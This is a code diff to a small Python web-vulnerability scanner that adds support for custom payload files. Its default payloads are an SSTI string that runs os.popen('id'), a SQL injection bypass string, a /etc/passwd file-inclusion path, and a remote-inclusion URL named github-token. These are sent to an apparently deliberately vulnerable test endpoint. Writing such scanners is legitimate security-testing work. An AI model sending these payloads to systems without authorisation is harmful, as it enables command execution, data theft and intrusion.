@@ -21,21 +21,42 @@ class Scanner:
         
         self.args = args
         self.url = self.args.url
-        self.ssti_payload = "{{namespace.__init__.__globals__.os.popen('id').read()}}"
-        self.sqli_payload = "'or 1=1--"
-        self.lfi_payload = "/etc/passwd"
-        self.rfi_payload = "http://127.0.0.1:4444/github-token"
+
+        if self.args.payload == "default":
+            self.ssti_payload = "{{namespace.__init__.__globals__.os.popen('id').read()}}"
+            self.sqli_payload = "'or 1=1--"
+            self.lfi_payload = "/etc/passwd"
+            self.rfi_payload = "http://127.0.0.1:4444/github-token"
+        else:
+            if len(open(self.args.payload).read()) <= 1:
+                raise Exception("Payload file must not be empty")
+            else:
+                self.ssti_payload = open(self.args.payload)
+                self.sqli_payload = open(self.args.payload)
+                self.lfi_payload = open(self.args.payload)
+                self.rfi_payload = open(self.args.payload)
         
 class Injection(Scanner):
     def ssti(self):
         try:
-            request_body = {"mathexp": self.ssti_payload}
-            response = requests.post(self.url + "/api/sstivuln", json=request_body, timeout=10)
-            if response.status_code == 200:
-                print(response.text)
-                print("Vulnerable to SSTI!\n")
+            if self.args.payload == "default":
+                request_body = {"mathexp": self.ssti_payload}
+                response = requests.post(self.url + "/api/sstivuln", json=request_body, timeout=10)
+                if response.status_code == 200:
+                    print(response.text)
+                    print("Vulnerable to SSTI!\n")
+                else:
+                    print("Not vulnerable")
             else:
-                print("Not vulnerable")
+                for payload in self.ssti_payload.readlines():
+                    print(payload)
+                    request_body = {"mathexp": payload}
+                    response = requests.post(self.url + "/api/sstivuln", json=request_body, timeout=10)
+                    if response.status_code == 200:
+                        print(response.text)
+                        print("Vulnerable to SSTI!\n")
+                    else:
+                        print("Not vulnerable")
         except Exception as e:
             print("Encounter an error:", e)
     
